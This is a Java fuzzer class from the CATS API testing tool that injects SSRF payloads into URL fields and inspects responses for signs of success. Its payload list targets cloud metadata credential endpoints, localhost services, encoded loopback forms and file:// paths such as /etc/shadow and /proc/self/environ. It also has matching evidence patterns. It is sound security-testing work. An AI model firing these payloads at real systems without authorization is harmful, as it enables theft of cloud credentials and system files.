package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.fuzzer.api.Fuzzer;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.executor.SimpleExecutorContext;
import com.endava.cats.fuzzer.fields.base.InjectionEvidenceVerifier;
import com.endava.cats.fuzzer.fields.base.PayloadReflections;
import com.endava.cats.http.HttpMethod;
import com.endava.cats.http.ResponseCodeFamily;
import com.endava.cats.http.ResponseCodeFamilyPredefined;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.CatsResultFactory;
import com.endava.cats.model.FindingConfidence;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.model.RequestTargetResolver;
import com.endava.cats.model.SecurityFinding;
import com.endava.cats.report.TestCaseListener;
import com.endava.cats.util.CatsModelUtils;
import com.endava.cats.util.CatsUtil;
import com.endava.cats.util.ConsoleUtils;
import com.endava.cats.util.JsonUtils;
import io.github.ludovicianul.prettylogger.PrettyLogger;
import io.github.ludovicianul.prettylogger.PrettyLoggerFactory;
import jakarta.inject.Singleton;

import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.Set;
import java.util.function.BiConsumer;

/**
 * Fuzzer that sends SSRF (Server-Side Request Forgery) payloads in URL-type fields.
 * <p>
 * This fuzzer tests for SSRF vulnerabilities by sending payloads targeting internal
 * services, cloud metadata endpoints, and local resources. It specifically targets
 * fields with URI/URL format or field names suggesting URL content.
 * </p>
 */
@Singleton
@FieldFuzzer
public class SSRFInUrlFieldsFuzzer implements Fuzzer {

    private static final List<String> URL_FIELD_PATTERNS = List.of(
            "url", "uri", "link", "href", "endpoint", "callback", "webhook",
            "redirect", "return", "next", "target", "dest", "destination",
            "path", "file", "image", "avatar", "icon", "logo", "source"
    );

    private static final List<String> SSRF_PAYLOADS = List.of(
            // Localhost variations
            "http://localhost",
            "http://localhost:80",
            "http://localhost:443",
            "http://localhost:22",
            "http://localhost:3306",
            "http://localhost:5432",
            "http://localhost:6379",
            "http://localhost:27017",
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8443",
            "http://[::1]",
            "http://[0:0:0:0:0:0:0:1]",
            "http://0.0.0.0",
            "http://0",
            "http://127.1",
            "http://127.0.1",
            // AWS metadata
            "http://169.254.169.254/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            // GCP metadata
            "http://metadata.google.internal/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            // Azure metadata
            "http://169.254.169.254/metadata/instance",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            // Internal services
            "http://internal-service.local",
            "http://internal.company.com",
            "http://intranet",
            "http://admin.internal",
            // File protocol
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///c:/windows/system32/drivers/etc/hosts",
            // DNS rebinding / bypass attempts
            "http://localtest.me",
            "http://spoofed.burpcollaborator.net",
            "http://127.0.0.1.nip.io",
            // Encoded variations
            "http://0x7f000001",
            "http://2130706433",
            "http://017700000001"
    );


    private static final List<EvidenceRule> EVIDENCE_RULES = List.of(
            new EvidenceRule(List.of("ami-id", "instance-id", "security-credentials", "iam/security-credentials",
                    "computemetadata", "service-accounts/default", "subscriptionid", "resourcegroupname"),
                    CatsResultFactory.Reason.CLOUD_METADATA_REFLECTED_SSRF.value(),
                    "Response contains cloud metadata indicator [%s]. This strongly suggests successful SSRF to cloud metadata service. Response code: %d",
                    true),
            new EvidenceRule(List.of("root:x:0:0", "root:*:0:0"),
                    CatsResultFactory.Reason.FILE_CONTENT_EXPOSED_SSRF.value(),
                    "Response contains file system content indicator [%s]. This indicates successful file:// protocol SSRF. Response code: %d",
                    true),
            new EvidenceRule(List.of("/bin/bash", "/bin/sh", "/etc/passwd", "/etc/shadow"),
                    CatsResultFactory.Reason.FILE_CONTENT_EXPOSED_SSRF.value(),
                    "Response contains file system content indicator [%s]. This indicates successful file:// protocol SSRF. Response code: %d",
                    false),
            new EvidenceRule(List.of("connection refused", "connection timed out", "no route to host", "network unreachable"),
                    CatsResultFactory.Reason.NETWORK_ERROR_SSRF.value(),
                    "Response contains network error [%s] indicating the server attempted to connect to the SSRF target. Response code: %d",
                    false),
            new EvidenceRule(List.of("could not resolve host", "getaddrinfo", "name or service not known"),
                    CatsResultFactory.Reason.DNS_RESOLUTION_SSRF.value(),
                    "Response contains DNS error [%s] indicating the server attempted to resolve the SSRF target hostname. Response code: %d",
                    false),
            new EvidenceRule(List.of("curl error", "urlopen error", "socket error", "failed to connect"),
                    CatsResultFactory.Reason.HTTP_CLIENT_SSRF.value(),
                    "Response contains HTTP client error [%s] indicating the server attempted to make an outbound request. Response code: %d",
                    false));

    // Intentional SSRF probe/evidence targets: loopback, unspecified and cloud metadata addresses.
    // These identify attack payloads; they are not CATS service endpoints.
    @SuppressWarnings("java:S1313")
    private static final List<String> INTERNAL_TARGETS = List.of(
            "localhost", "127.0.0.1", "0.0.0.0", "169.254.169.254", "metadata.google.internal", "metadata.azure.com");

    private final PrettyLogger logger = PrettyLoggerFactory.getLogger(getClass());
    private final SimpleExecutor simpleExecutor;
    private final TestCaseListener testCaseListener;
    private final InjectionEvidenceVerifier evidenceVerifier;

    /**
     * Creates a new SSRFInUrlFieldsFuzzer instance.
     *
     * @param simpleExecutor   the executor used to run the fuzz logic
     * @param testCaseListener the test case listener for reporting results
     * @param evidenceVerifier verifies candidate findings against a baseline response and a replay
     */
    public SSRFInUrlFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener,
                                 InjectionEvidenceVerifier evidenceVerifier) {
        this.simpleExecutor = simpleExecutor;
        this.testCaseListener = testCaseListener;
        this.evidenceVerifier = evidenceVerifier;
    }

    @Override
    public void fuzz(FuzzingData data) {
        if (JsonUtils.isEmptyPayload(data.getPayload())) {
            logger.skip("Skip fuzzer as payload is empty");
            return;
        }

        Set<String> urlFields = getUrlFields(data);

        if (urlFields.isEmpty()) {
            logger.skip("No URL-type fields found in the request");
            return;
        }

        logger.info("Found {} URL-type field(s) to test for SSRF", urlFields.size());

        for (String field : urlFields) {
            fuzzField(data, field);
        }
    }

    private void fuzzField(FuzzingData data, String field) {
        SSRF_PAYLOADS.forEach(payload -> sendPayload(new SsrfAttempt(data, field, payload)));
    }

    private void sendPayload(SsrfAttempt attempt) {
        simpleExecutor.execute(requestContext(attempt, (response, data) -> processResponse(response, data, attempt)));
    }

    private SimpleExecutorContext requestContext(SsrfAttempt attempt, BiConsumer<CatsResponse, FuzzingData> responseProcessor) {
        return SimpleExecutorContext.builder()
                .responseProcessor(responseProcessor)
                .expectedResponseCode(ResponseCodeFamilyPredefined.FOURXX)
                .fuzzingData(attempt.data())
                .logger(logger)
                .scenario("Send SSRF payload in URL field [%s]: [%s]"
                        .formatted(attempt.field(), truncatePayload(attempt.payload())))
                .fuzzer(this)
                .payload(CatsUtil.justReplaceField(attempt.data().getPayload(), attempt.field(), attempt.payload()).json())
                .mutationTargets(RequestTargetResolver.resolvePayloadField(attempt.data(), attempt.field()))
                .build();
    }

    private void processResponse(CatsResponse response, FuzzingData data, SsrfAttempt attempt) {
        Optional<SSRFDetectionResult> detection = detectSSRFEvidence(response, attempt.payload());
        Optional<SecurityFinding> finding = detection.isPresent()
                ? detection.flatMap(result -> verifiedFinding(data, attempt, result))
                : reflectedPayloadFinding(response, attempt.payload());
        finding.ifPresentOrElse(
                securityFinding -> testCaseListener.reportSecurityFinding(logger, data, response, securityFinding),
                () -> reportWithoutFinding(response, data));
    }

    /**
     * Detects evidence of SSRF in the response, after removing reflections of the payload from its body.
     *
     * @param response the HTTP response to analyze
     * @param payload  the SSRF payload that was sent
     * @return the detected evidence, if any
     */
    private Optional<SSRFDetectionResult> detectSSRFEvidence(CatsResponse response, String payload) {
        CatsResponse evidence = PayloadReflections.strip(response, payload);
        String responseLower = Optional.ofNullable(evidence.getBody()).orElse("").toLowerCase(Locale.ROOT);
        return EVIDENCE_RULES.stream()
                .map(rule -> rule.match(responseLower, response.getResponseCode()))
                .flatMap(Optional::stream)
                .findFirst()
                .or(() -> internalTargetEvidence(responseLower, payload, response.getResponseCode()));
    }

    private Optional<SecurityFinding> verifiedFinding(FuzzingData data, SsrfAttempt attempt, SSRFDetectionResult result) {
        return evidenceVerifier.verify(new InjectionEvidenceVerifier.Check(data, result.strong(),
                        candidate -> detectSSRFEvidence(candidate, attempt.payload()).isPresent(),
                        new InjectionEvidenceVerifier.Probes(() -> simpleExecutor.replayOriginal(data),
                                () -> simpleExecutor.replay(requestContext(attempt, null)))))
                .map(confidence -> new SecurityFinding(result.title(), result.message(), confidence));
    }

    private static Optional<SSRFDetectionResult> internalTargetEvidence(String responseLower, String payload, int responseCode) {
        String payloadLower = payload.toLowerCase(Locale.ROOT);
        return INTERNAL_TARGETS.stream()
                .filter(target -> responseLower.contains(target) && payloadLower.contains(target))
                .findFirst()
                .map(target -> new SSRFDetectionResult(CatsResultFactory.Reason.INTERNAL_TARGET_REFLECTED_SSRF.value(),
                        "Response contains internal target [%s] from the SSRF payload outside of a plain echo of the payload. This may indicate the server processed the internal URL. Response code: %d"
                                .formatted(target, responseCode), false));
    }

    /**
     * A plain echo of the URL is expected for APIs that store URLs, so it is only ever a tentative finding.
     */
    private static Optional<SecurityFinding> reflectedPayloadFinding(CatsResponse response, String payload) {
        if (!Optional.ofNullable(response.getBody()).orElse("").contains(payload)) {
            return Optional.empty();
        }
        return Optional.of(new SecurityFinding(CatsResultFactory.Reason.SSRF_REFLECTED.value(),
                "The SSRF payload [%s] was reflected in the response body. This may indicate the server processed the URL, but APIs storing URLs also echo them back. Response code: %d"
                        .formatted(truncatePayload(payload), response.getResponseCode()),
                FindingConfidence.TENTATIVE));
    }

    private void reportWithoutFinding(CatsResponse response, FuzzingData data) {
        int responseCode = response.getResponseCode();
        if (ResponseCodeFamily.is5xxCode(responseCode)) {
            testCaseListener.reportResultError(logger, data, CatsResultFactory.Reason.SERVER_ERROR.value(),
                    "Server returned %d error when processing SSRF payload. This may indicate the server attempted to connect to the target."
                            .formatted(responseCode));
        } else if (ResponseCodeFamily.is4xxCode(responseCode)) {
            testCaseListener.reportResultInfo(logger, data, "SSRF payload rejected",
                    "Server properly rejected the SSRF payload with response code %d".formatted(responseCode));
        } else if (ResponseCodeFamily.is2xxCode(responseCode)) {
            testCaseListener.reportResultInfo(logger, data, "SSRF payload accepted",
                    "SSRF payload was accepted (response code %d). No SSRF indicators found in response.".formatted(responseCode));
        } else {
            testCaseListener.reportResultError(logger, data, CatsResultFactory.Reason.UNEXPECTED_RESPONSE_CODE.value(),
                    "Received unexpected response code %d for SSRF payload".formatted(responseCode));
        }
    }

    /**
     * Gets fields that are likely to contain URLs based on schema format or field name.
     */
    private Set<String> getUrlFields(FuzzingData data) {
        return FuzzingData.filterFieldsInPayload(data, field -> isUrlField(field, data), 0);
    }

    private boolean isUrlField(String fieldName, FuzzingData data) {
        var schema = data.getRequestPropertyTypes().get(fieldName);

        if (schema != null && CatsModelUtils.isUriSchema(schema)) {
            return true;
        }

        if (schema != null && CatsModelUtils.isUrlSchema(schema)) {
            return true;
        }

        if (schema != null && !CatsModelUtils.isStringSchema(schema)) {
            return false;
        }

        String lowerFieldName = fieldName.toLowerCase(Locale.ROOT);
        return URL_FIELD_PATTERNS.stream()
                .anyMatch(lowerFieldName::contains);
    }

    private static String truncatePayload(String payload) {
        return payload.length() > 50 ? payload.substring(0, 50) + "..." : payload;
    }

    @Override
    public List<HttpMethod> skipForHttpMethods() {
        return List.of(HttpMethod.HEAD, HttpMethod.TRACE);
    }

    @Override
    public String description() {
        return "iterate through URL-type fields and send SSRF payloads to detect Server-Side Request Forgery vulnerabilities";
    }

    @Override
    public String toString() {
        return ConsoleUtils.sanitizeFuzzerName(this.getClass().getSimpleName());
    }

    private record SsrfAttempt(FuzzingData data, String field, String payload) {
    }

    /**
     * A family of response indicators for one SSRF reason.
     *
     * @param strong whether the indicators are artefacts that only a successful request to the target can produce
     */
    private record EvidenceRule(List<String> patterns, String reason, String messageTemplate, boolean strong) {
        Optional<SSRFDetectionResult> match(String responseLower, int responseCode) {
            return patterns.stream()
                    .filter(responseLower::contains)
                    .findFirst()
                    .map(pattern -> new SSRFDetectionResult(reason, messageTemplate.formatted(pattern, responseCode), strong));
        }
    }

    /**
     * Result of SSRF detection analysis.
     */
    private record SSRFDetectionResult(String title, String message, boolean strong) {
    }
}
